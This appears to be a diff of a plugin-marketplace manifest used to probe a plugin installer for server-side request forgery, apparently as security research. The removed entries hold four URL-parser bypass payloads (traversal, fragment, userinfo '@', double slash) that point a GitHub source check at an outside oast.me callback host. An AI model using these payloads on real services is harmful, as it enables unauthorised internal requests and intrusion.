@@ -1,51 +1,36 @@
 {
-  "name": "ssrf-probe-058-v3",
-  "description": "valid + bypass attempts",
+  "name": "ssrf-probe-058-v4",
+  "description": "git-subdir + .git suffix",
   "owner": {"name": "research", "email": "liamconner10@gmail.com"},
   "plugins": [
     {
-      "name": "valid-plugin-self",
-      "description": "valid github source",
+      "name": "git-subdir-test",
+      "description": "git-subdir source",
       "category": "research",
       "source": {
-        "source": "url",
-        "url": "https://github.com/LiamConner10/058-plugin-source"
+        "source": "git-subdir",
+        "url": "https://github.com/LiamConner10/058-plugin-source.git",
+        "path": "subpath",
+        "ref": "main"
       }
     },
     {
-      "name": "bypass-1-trailing-slash",
-      "description": "trailing slash",
+      "name": "git-suffix",
+      "description": ".git suffix",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://github.com/LiamConner10/058-plugin-source/../../d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me"
+        "url": "https://github.com/LiamConner10/058-plugin-source.git"
       }
     },
     {
-      "name": "bypass-2-fragment",
-      "description": "fragment after host",
+      "name": "url-with-branch",
+      "description": "URL with branch param",
       "category": "research",
       "source": {
         "source": "url",
-        "url": "https://github.com/LiamConner10/058-plugin-source#@d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/owner/repo"
-      }
-    },
-    {
-      "name": "bypass-3-userinfo",
-      "description": "userinfo with at",
-      "category": "research",
-      "source": {
-        "source": "url",
-        "url": "https://github.com@d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/owner/repo"
-      }
-    },
-    {
-      "name": "bypass-4-double-slash",
-      "description": "double slash",
-      "category": "research",
-      "source": {
-        "source": "url",
-        "url": "https://github.com//d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me/owner/repo"
+        "url": "https://github.com/LiamConner10/058-plugin-source",
+        "sha": "abcdef"
       }
     }
   ]
